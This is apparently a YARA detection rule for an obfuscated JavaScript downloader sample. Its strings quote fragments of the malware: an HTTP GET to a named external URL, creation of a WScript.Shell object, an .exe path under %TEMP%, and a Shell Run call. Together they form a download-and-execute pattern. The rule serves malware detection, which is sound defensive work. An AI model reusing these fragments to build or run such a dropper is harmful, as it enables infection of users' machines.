rule sig_20160401_1ff6ea0f457476cc4a92c63d3e404895 {
  meta:
    description = "datamaliciousorder - file 20160401_1ff6ea0f457476cc4a92c63d3e404895.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6caffe0f2b1d1aa96349251f3e2e0311841722a80e159963e1327f081ad735da"

  strings:
    $s1  = "AvAk[XmArx](\"G\" + \"ET\", \"http://langeparis.com.au/s0powa\", false);" fullword ascii
    $s2  = "var UyvJe = function AxGdh() {return WScript[ZoHu](\"WScript\"+\".Shell\");}(), HftTk = 11;" fullword ascii
    $s3  = "function OkbNt(HnfTlj, HevIj){PdXs = PdXs * 1; return HnfTlj - HevIj;};" fullword ascii
    $s4  = "if (AvAk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XkxTrl() {return UyvJe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"43EdKOlIpF.ex\" + \"e\";};" fullword ascii
    $s6  = "function SlGkw(){return HzGa + \"\";};" fullword ascii
    $s7  = "function DwjBu() {return ((AvaKo == true) && (AvaKo == XqMs)) ? 1 : PdXs;};" fullword ascii
    $s8  = "AvaKo = true; " fullword ascii
    $s9  = "function MivWf(QmdLxp) {var GeoJb = (1, 2, 3, 4, 5, QmdLxp); return GeoJb;};" fullword ascii
    $s10 = "XqMs = true; " fullword ascii
    $s11 = "return OkbNt(IuGe, ErQjr);" fullword ascii
    $s12 = "function XaSd()" fullword ascii
    $s13 = "}while (DkSsg);" fullword ascii
    $s14 = "var AvaKo = false;" fullword ascii
    $s15 = "var SkWsa = false;" fullword ascii
    $s16 = "function ErlMw(QkvZy){UyvJe[\"R\"+\"un\"](QkvZy, PdXs, PdXs);};" fullword ascii
    $s17 = "var XqMs = false;" fullword ascii
    $s18 = "function FqBmo(){return ZoHu;};" fullword ascii
    $s19 = "var NiiAs = new this[\"Date\"]();" fullword ascii
    $s20 = "function PsxMl(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}